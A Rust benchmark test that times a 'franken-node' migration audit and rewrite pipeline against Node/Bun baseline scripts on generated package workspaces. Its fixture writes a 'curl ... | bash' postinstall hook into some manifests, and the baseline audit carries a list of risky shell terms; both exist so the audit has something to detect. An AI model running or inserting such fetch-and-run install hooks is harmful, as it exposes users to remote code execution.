use hmac::{Hmac, KeyInit, Mac};
use serde_json::{json, Value};
use sha2::Sha256;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::time::Instant;

const BENCH_FIXTURE_PACKAGES: usize = 96;
const WARMUP_RUNS: usize = 1;
const MEASURED_RUNS: usize = 5;
const MINIMUM_RATIO: f64 = 3.0;
const REPORT_PATH: &str = "artifacts/bench/migration_throughput.json";
const SIGNING_KEY: &[u8] = b"franken-node-migration-throughput-bench-v1";

#[derive(Debug, Clone, Copy)]
struct TimingSample {
    wall_ms: f64,
    cpu_ms: f64,
}

#[test]
fn migrate_audit_rewrite_pipeline_meets_throughput_claim() {
    let repo = repo_root();
    let franken_node = franken_node_binary();
    let js_runtime = resolve_js_runtime();
    let harness_dir = tempfile::tempdir().expect("benchmark harness tempdir");
    let audit_script = harness_dir.path().join("baseline_audit.js");
    let rewrite_script = harness_dir.path().join("baseline_rewrite.js");
    write_baseline_scripts(&audit_script, &rewrite_script);

    let equivalence = verify_pipeline_equivalence(
        &franken_node,
        &js_runtime,
        &audit_script,
        &rewrite_script,
        harness_dir.path(),
    );
    assert_eq!(equivalence["summary_counts_match"], true);
    assert_eq!(equivalence["rewrite_engines_match"], true);

    for _ in 0..WARMUP_RUNS {
        let _ = measure_franken_pipeline(&franken_node, harness_dir.path(), "franken-warmup");
        let _ = measure_baseline_pipeline(
            &js_runtime,
            &audit_script,
            &rewrite_script,
            harness_dir.path(),
            "baseline-warmup",
        );
    }

    let franken_samples = (0..MEASURED_RUNS)
        .map(|index| {
            measure_franken_pipeline(
                &franken_node,
                harness_dir.path(),
                &format!("franken-{index}"),
            )
        })
        .collect::<Vec<_>>();
    let baseline_samples = (0..MEASURED_RUNS)
        .map(|index| {
            measure_baseline_pipeline(
                &js_runtime,
                &audit_script,
                &rewrite_script,
                harness_dir.path(),
                &format!("baseline-{index}"),
            )
        })
        .collect::<Vec<_>>();

    let franken_mean_ms = mean_wall_ms(&franken_samples);
    let baseline_mean_ms = mean_wall_ms(&baseline_samples);
    let ratio = baseline_mean_ms / franken_mean_ms;
    let passed = ratio >= MINIMUM_RATIO;

    let mut report = json!({
        "schema_version": "1.0.0",
        "benchmark_id": "migration_throughput_audit_rewrite_v1",
        "charter_claim": "section_5_migration_throughput_ge_3x",
        "generated_at_utc": chrono::Utc::now().to_rfc3339(),
        "fixture": {
            "project_kind": "generated_js_workspace",
            "package_manifests": BENCH_FIXTURE_PACKAGES,
            "risky_script_period": 8,
            "missing_engine_period": 3,
            "lockfiles": 1
        },
        "commands": {
            "franken_pipeline": "franken-node migrate audit --format json && franken-node migrate rewrite --apply",
            "baseline_pipeline": "node/bun baseline_audit.js && node/bun baseline_rewrite.js",
            "baseline_runtime": js_runtime.display().to_string(),
            "baseline_runtime_version": command_version(&js_runtime),
            "franken_node_binary": franken_node.display().to_string(),
            "franken_node_binary_source": if std::env::var_os("FRANKEN_NODE_BENCH_BIN").is_some() {
                "FRANKEN_NODE_BENCH_BIN"
            } else {
                "cargo test binary fallback"
            }
        },
        "measurement": {
            "warmup_runs": WARMUP_RUNS,
            "measured_runs": MEASURED_RUNS,
            "wall_time_source": "std::time::Instant around /usr/bin/time child",
            "cpu_time_source": "/usr/bin/time -p user+sys",
            "fixture_setup_excluded": true
        },
        "equivalence_checks": equivalence,
        "baseline_mean_ms": round_3(baseline_mean_ms),
        "franken_mean_ms": round_3(franken_mean_ms),
        "baseline_cpu_mean_ms": round_3(mean_cpu_ms(&baseline_samples)),
        "franken_cpu_mean_ms": round_3(mean_cpu_ms(&franken_samples)),
        "ratio": round_3(ratio),
        "pass_criterion": {
            "minimum_ratio": MINIMUM_RATIO,
            "passed": passed
        },
        "samples": {
            "baseline_wall_ms": rounded_wall_samples(&baseline_samples),
            "franken_wall_ms": rounded_wall_samples(&franken_samples),
            "baseline_cpu_ms": rounded_cpu_samples(&baseline_samples),
            "franken_cpu_ms": rounded_cpu_samples(&franken_samples)
        }
    });

    let signature = sign_report(&report);
    report["signature"] = json!({
        "algorithm": "hmac-sha256",
        "key_id": "migration-throughput-bench-local-v1",
        "value": signature
    });

    let report_path = repo.join(REPORT_PATH);
    fs::create_dir_all(report_path.parent().expect("report parent")).expect("report dir");
    fs::write(
        &report_path,
        format!(
            "{}\n",
            serde_json::to_string_pretty(&report).expect("report json")
        ),
    )
    .expect("write migration throughput report");

    assert!(
        passed,
        "migration throughput ratio {ratio:.3}x did not meet {MINIMUM_RATIO:.1}x criterion; report written to {}",
        report_path.display()
    );
}

fn repo_root() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .and_then(Path::parent)
        .expect("workspace root")
        .to_path_buf()
}

fn franken_node_binary() -> PathBuf {
    if let Some(path) = std::env::var_os("FRANKEN_NODE_BENCH_BIN") {
        return PathBuf::from(path);
    }
    if let Some(path) = std::env::var_os("CARGO_BIN_EXE_franken-node") {
        return PathBuf::from(path);
    }
    repo_root().join("target/debug/franken-node")
}

fn resolve_js_runtime() -> PathBuf {
    which::which("node")
        .or_else(|_| which::which("bun"))
        .expect("node or bun runtime required for migration throughput baseline")
}

fn command_version(command: &Path) -> String {
    let direct = Command::new(command)
        .arg("--version")
        .output()
        .ok()
        .and_then(|output| {
            let text = String::from_utf8_lossy(&output.stdout).trim().to_string();
            if text.is_empty() {
                None
            } else {
                Some(text)
            }
        });
    if let Some(version) = direct {
        return version;
    }

    if command.file_name().and_then(|name| name.to_str()) == Some("node") {
        if let Some(parent) = command.parent() {
            let bun = parent.join("bun");
            if bun.is_file() {
                if let Some(version) =
                    Command::new(&bun)
                        .arg("--version")
                        .output()
                        .ok()
                        .and_then(|output| {
                            let text = String::from_utf8_lossy(&output.stdout).trim().to_string();
                            if text.is_empty() {
                                None
                            } else {
                                Some(text)
                            }
                        })
                {
                    return format!("bun-node-wrapper {version}");
                }
            }
        }
    }

    "unknown".to_string()
}

fn measure_franken_pipeline(binary: &Path, harness_dir: &Path, label: &str) -> TimingSample {
    let project = build_fixture_project(harness_dir, label);
    let command = format!(
        "{} migrate audit {} --format json >/dev/null && {} migrate rewrite {} --apply >/dev/null",
        shell_quote(binary),
        shell_quote(&project),
        shell_quote(binary),
        shell_quote(&project),
    );
    measure_shell_pipeline(&command)
}

fn measure_baseline_pipeline(
    runtime: &Path,
    audit_script: &Path,
    rewrite_script: &Path,
    harness_dir: &Path,
    label: &str,
) -> TimingSample {
    let project = build_fixture_project(harness_dir, label);
    let command = format!(
        "{} {} {} >/dev/null && {} {} {} >/dev/null",
        shell_quote(runtime),
        shell_quote(audit_script),
        shell_quote(&project),
        shell_quote(runtime),
        shell_quote(rewrite_script),
        shell_quote(&project),
    );
    measure_shell_pipeline(&command)
}

fn measure_shell_pipeline(command: &str) -> TimingSample {
    let started_at = Instant::now();
    let output = Command::new("/usr/bin/time")
        .args(["-p", "sh", "-c", command])
        .output()
        .unwrap_or_else(|err| panic!("failed to run timed pipeline `{command}`: {err}"));
    let wall_ms = started_at.elapsed().as_secs_f64() * 1000.0;
    assert!(
        output.status.success(),
        "pipeline failed: {command}\nstdout={}\nstderr={}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    let cpu_ms = parse_cpu_time_output(&output.stderr);
    TimingSample { wall_ms, cpu_ms }
}

fn parse_cpu_time_output(stderr: &[u8]) -> f64 {
    let text = String::from_utf8_lossy(stderr);
    let mut user = None;
    let mut sys = None;
    for line in text.lines() {
        let mut parts = line.split_whitespace();
        let Some(key) = parts.next() else {
            continue;
        };
        let Some(value) = parts.next().and_then(|raw| raw.parse::<f64>().ok()) else {
            continue;
        };
        match key {
            "user" => user = Some(value),
            "sys" => sys = Some(value),
            _ => {}
        }
    }
    let user = user.unwrap_or_else(|| panic!("missing user time in /usr/bin/time output: {text}"));
    let sys = sys.unwrap_or_else(|| panic!("missing sys time in /usr/bin/time output: {text}"));
    (user + sys) * 1000.0
}

fn verify_pipeline_equivalence(
    binary: &Path,
    runtime: &Path,
    audit_script: &Path,
    rewrite_script: &Path,
    harness_dir: &Path,
) -> Value {
    let franken_audit_project = build_fixture_project(harness_dir, "equiv-franken-audit");
    let baseline_audit_project = build_fixture_project(harness_dir, "equiv-baseline-audit");
    let franken_audit = run_json_command(
        binary,
        &[
            "migrate",
            "audit",
            franken_audit_project.to_str().expect("utf-8 project path"),
            "--format",
            "json",
        ],
    );
    let baseline_audit = run_json_command(
        runtime,
        &[
            audit_script.to_str().expect("utf-8 audit script path"),
            baseline_audit_project.to_str().expect("utf-8 project path"),
        ],
    );

    let franken_rewrite_project = build_fixture_project(harness_dir, "equiv-franken-rewrite");
    let baseline_rewrite_project = build_fixture_project(harness_dir, "equiv-baseline-rewrite");
    run_success(
        binary,
        &[
            "migrate",
            "rewrite",
            franken_rewrite_project
                .to_str()
                .expect("utf-8 project path"),
            "--apply",
        ],
    );
    run_success(
        runtime,
        &[
            rewrite_script.to_str().expect("utf-8 rewrite script path"),
            baseline_rewrite_project
                .to_str()
                .expect("utf-8 project path"),
        ],
    );

    let summary_counts_match = franken_audit["summary"]["files_scanned"]
        == baseline_audit["summary"]["files_scanned"]
        && franken_audit["summary"]["package_manifests"]
            == baseline_audit["summary"]["package_manifests"]
        && franken_audit["summary"]["risky_scripts"] == baseline_audit["summary"]["risky_scripts"]
        && franken_audit["summary"]["lockfiles"] == baseline_audit["summary"]["lockfiles"];
    let franken_engine_count = count_manifests_with_node_engine(&franken_rewrite_project);
    let baseline_engine_count = count_manifests_with_node_engine(&baseline_rewrite_project);
    let package_count = franken_audit["summary"]["package_manifests"]
        .as_u64()
        .expect("package manifest count") as usize;

    json!({
        "summary_counts_match": summary_counts_match,
        "rewrite_engines_match": franken_engine_count == baseline_engine_count,
        "rewritten_manifests_with_node_engine": franken_engine_count,
        "expected_package_manifests": package_count
    })
}

fn run_json_command(command: &Path, args: &[&str]) -> Value {
    let output = Command::new(command)
        .args(args)
        .output()
        .unwrap_or_else(|err| panic!("failed to run {}: {err}", command.display()));
    assert!(
        output.status.success(),
        "command failed: {} {:?}\nstdout={}\nstderr={}",
        command.display(),
        args,
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    serde_json::from_slice(&output.stdout).unwrap_or_else(|err| {
        panic!(
            "stdout was not JSON for {} {:?}: {err}\n{}",
            command.display(),
            args,
            String::from_utf8_lossy(&output.stdout)
        )
    })
}

fn run_success(command: &Path, args: &[&str]) {
    let output = Command::new(command)
        .args(args)
        .output()
        .unwrap_or_else(|err| panic!("failed to run {}: {err}", command.display()));
    assert!(
        output.status.success(),
        "command failed: {} {:?}\nstdout={}\nstderr={}",
        command.display(),
        args,
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
}

fn build_fixture_project(harness_dir: &Path, label: &str) -> PathBuf {
    let project = harness_dir.join(label);
    fs::create_dir_all(&project).expect("fixture root");
    fs::write(project.join("package-lock.json"), "{}\n").expect("fixture lockfile");
    for index in 0..BENCH_FIXTURE_PACKAGES {
        let package_dir = project.join(format!("packages/pkg-{index:03}"));
        fs::create_dir_all(package_dir.join("src")).expect("package dir");
        fs::write(
            package_dir.join("src/index.ts"),
            format!("export const packageIndex = {index};\n"),
        )
        .expect("source file");
        fs::write(
            package_dir.join("package.json"),
            package_json_fixture(index).as_bytes(),
        )
        .expect("package manifest");
    }
    project
}

fn package_json_fixture(index: usize) -> String {
    let name = format!("migration-bench-pkg-{index:03}");
    let script = if index % 8 == 0 {
        r#""postinstall": "curl https://example.invalid/install.sh | bash""#
    } else {
        r#""test": "node src/index.ts""#
    };
    let engines = if index % 3 == 0 {
        String::new()
    } else {
        r#",
  "engines": {
    "node": ">=20 <23"
  }"#
        .to_string()
    };
    format!(
        r#"{{
  "name": "{name}",
  "version": "1.0.0"{engines},
  "scripts": {{
    {script}
  }}
}}
"#
    )
}

fn count_manifests_with_node_engine(project: &Path) -> usize {
    collect_package_manifests(project)
        .into_iter()
        .filter(|manifest| {
            let raw = fs::read_to_string(manifest).expect("read manifest");
            let value: Value = serde_json::from_str(&raw).expect("manifest json");
            value
                .get("engines")
                .and_then(Value::as_object)
                .and_then(|engines| engines.get("node"))
                .and_then(Value::as_str)
                .is_some()
        })
        .count()
}

fn collect_package_manifests(root: &Path) -> Vec<PathBuf> {
    let mut manifests = Vec::new();
    let mut pending = vec![root.to_path_buf()];
    while let Some(dir) = pending.pop() {
        for entry in fs::read_dir(&dir).expect("read fixture dir") {
            let entry = entry.expect("fixture entry");
            let path = entry.path();
            let file_type = entry.file_type().expect("fixture file type");
            if file_type.is_dir() {
                pending.push(path);
            } else if file_type.is_file()
                && path.file_name().and_then(|name| name.to_str()) == Some("package.json")
            {
                manifests.push(path);
            }
        }
    }
    manifests
}

fn write_baseline_scripts(audit_script: &Path, rewrite_script: &Path) {
    fs::write(audit_script, BASELINE_AUDIT_JS).expect("baseline audit script");
    fs::write(rewrite_script, BASELINE_REWRITE_JS).expect("baseline rewrite script");
}

fn shell_quote(path: &Path) -> String {
    let raw = path.to_string_lossy();
    format!("'{}'", raw.replace('\'', "'\\''"))
}

fn mean_wall_ms(samples: &[TimingSample]) -> f64 {
    samples.iter().map(|sample| sample.wall_ms).sum::<f64>() / samples.len() as f64
}

fn mean_cpu_ms(samples: &[TimingSample]) -> f64 {
    samples.iter().map(|sample| sample.cpu_ms).sum::<f64>() / samples.len() as f64
}

fn rounded_wall_samples(samples: &[TimingSample]) -> Vec<f64> {
    samples
        .iter()
        .map(|sample| round_3(sample.wall_ms))
        .collect()
}

fn rounded_cpu_samples(samples: &[TimingSample]) -> Vec<f64> {
    samples
        .iter()
        .map(|sample| round_3(sample.cpu_ms))
        .collect()
}

fn round_3(value: f64) -> f64 {
    (value * 1000.0).round() / 1000.0
}

fn sign_report(report_without_signature: &Value) -> String {
    let canonical =
        serde_json::to_string(report_without_signature).expect("canonical report payload");
    let mut mac =
        Hmac::<Sha256>::new_from_slice(SIGNING_KEY).expect("benchmark HMAC key should be valid");
    mac.update(canonical.as_bytes());
    format!("hmac-sha256:{}", hex::encode(mac.finalize().into_bytes()))
}

const BASELINE_AUDIT_JS: &str = r#"
const fs = require('fs');
const path = require('path');
const root = process.argv[2];
const riskyTerms = ['curl ', 'wget ', 'chmod +x', 'bash -c', 'powershell ', 'sudo ', 'rm -rf', 'node-gyp'];
const lockfiles = new Set(['package-lock.json', 'npm-shrinkwrap.json', 'pnpm-lock.yaml', 'yarn.lock', 'bun.lockb', 'bun.lock']);
const summary = { files_scanned: 0, js_files: 0, ts_files: 0, package_manifests: 0, risky_scripts: 0, lockfiles: [] };

function isRiskyScript(scriptName, command) {
  const script = scriptName.toLowerCase();
  const cmd = String(command).toLowerCase();
  return script === 'preinstall' || script === 'install' || script === 'postinstall' || riskyTerms.some((term) => cmd.includes(term));
}

function walk(dir) {
  for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
    if (entry.name === 'node_modules' || entry.name === '.git') continue;
    const full = path.join(dir, entry.name);
    if (entry.isDirectory()) {
      walk(full);
      continue;
    }
    if (!entry.isFile()) continue;
    summary.files_scanned += 1;
    if (entry.name === 'package.json') {
      summary.package_manifests += 1;
      const manifest = JSON.parse(fs.readFileSync(full, 'utf8'));
      for (const [scriptName, command] of Object.entries(manifest.scripts || {})) {
        if (isRiskyScript(scriptName, command)) summary.risky_scripts += 1;
      }
    }
    if (lockfiles.has(entry.name)) summary.lockfiles.push(path.relative(root, full).replaceAll(path.sep, '/'));
    const ext = path.extname(entry.name).toLowerCase();
    if (ext === '.js' || ext === '.cjs' || ext === '.mjs' || ext === '.jsx') summary.js_files += 1;
    if (ext === '.ts' || ext === '.tsx') summary.ts_files += 1;
  }
}

walk(root);
summary.lockfiles.sort();
console.log(JSON.stringify({ schema_version: 'baseline-v1', summary }, null, 2));
"#;

const BASELINE_REWRITE_JS: &str = r#"
const fs = require('fs');
const path = require('path');
const root = process.argv[2];
let rewritten = 0;

function walk(dir) {
  for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
    if (entry.name === 'node_modules' || entry.name === '.git') continue;
    const full = path.join(dir, entry.name);
    if (entry.isDirectory()) {
      walk(full);
      continue;
    }
    if (!entry.isFile() || entry.name !== 'package.json') continue;
    const manifest = JSON.parse(fs.readFileSync(full, 'utf8'));
    if (!manifest.engines || typeof manifest.engines !== 'object') manifest.engines = {};
    if (!manifest.engines.node) {
      manifest.engines.node = '>=20 <23';
      rewritten += 1;
    }
    fs.writeFileSync(full, `${JSON.stringify(manifest, null, 2)}\n`);
  }
}

walk(root);
console.log(JSON.stringify({ schema_version: 'baseline-v1', rewritten }, null, 2));
"#;
